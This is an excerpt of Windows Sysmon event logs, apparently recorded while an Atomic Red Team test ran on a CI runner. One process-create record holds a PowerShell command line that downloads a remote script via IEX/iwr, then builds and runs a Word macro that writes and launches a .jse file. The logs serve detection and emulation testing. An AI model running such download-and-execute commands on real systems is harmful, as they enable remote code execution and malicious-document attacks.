UtcTime: 2025-12-17 07:58:36.804
ProcessGuid: {f995aebf-62ac-6942-9804-000000000e00}
ProcessId: 9932
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_ruqhzdeh.jbe.ps1
CreationUtcTime: 2025-12-17 07:58:36.804
User: runnervm8j6r3\runneradmin"
"12/17/2025 7:58:36 AM","1","Process Create:
RuleName: ProcessCreate
UtcTime: 2025-12-17 07:58:36.719
ProcessGuid: {f995aebf-62ac-6942-9804-000000000e00}
ProcessId: 9932
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
FileVersion: 10.0.26100.5074 (WinBuild.160101.0800)
Description: Windows PowerShell
Product: Microsoft? Windows? Operating System
Company: Microsoft Corporation
OriginalFileName: PowerShell.EXE
CommandLine: ""powershell.exe"" & {[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
IEX (iwr \""""https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1\"""" -UseBasicParsing)
$macrocode = \""""   Open `\""""C:\Users\Public\art.jse`\"""" For Output As #1`n   Write #1, `\""""WScript.Quit`\""""`n   Close #1`n   Shell`$ `\""""cscript.exe C:\Users\Public\art.jse`\""""`n\""""
Invoke-MalDoc -macroCode $macrocode -officeProduct \""""Word\""""}
CurrentDirectory: C:\Users\RUNNER~1\AppData\Local\Temp\
User: runnervm8j6r3\runneradmin
LogonGuid: {f995aebf-552e-6942-89d0-0b0000000000}
LogonId: 0xBD089
TerminalSessionId: 2
IntegrityLevel: High
Hashes: SHA256=0FF6F2C94BC7E2833A5F7E16DE1622E5DBA70396F31C7D5F56381870317E8C46
ParentProcessGuid: {f995aebf-60ec-6942-6203-000000000e00}
ParentProcessId: 8612
ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
ParentCommandLine: ""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.EXE"" -command "". 'D:\a\_temp\cb932f1c-bec9-45d5-9be7-d59944af95ba.ps1'""
ParentUser: runnervm8j6r3\runneradmin"
"12/17/2025 7:58:35 AM","23","File Delete archived:
RuleName: FileDelete
UtcTime: 2025-12-17 07:58:35.642
ProcessGuid: {f995aebf-62ab-6942-9404-000000000e00}
ProcessId: 9256
User: runnervm8j6r3\runneradmin
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_rgbodyc2.eki.ps1
Hashes: SHA256=96AD1146EB96877EAB5942AE0736B82D8B5E2039A80D3D6932665C1A4C87DCF7
IsExecutable: false
Archived: true"
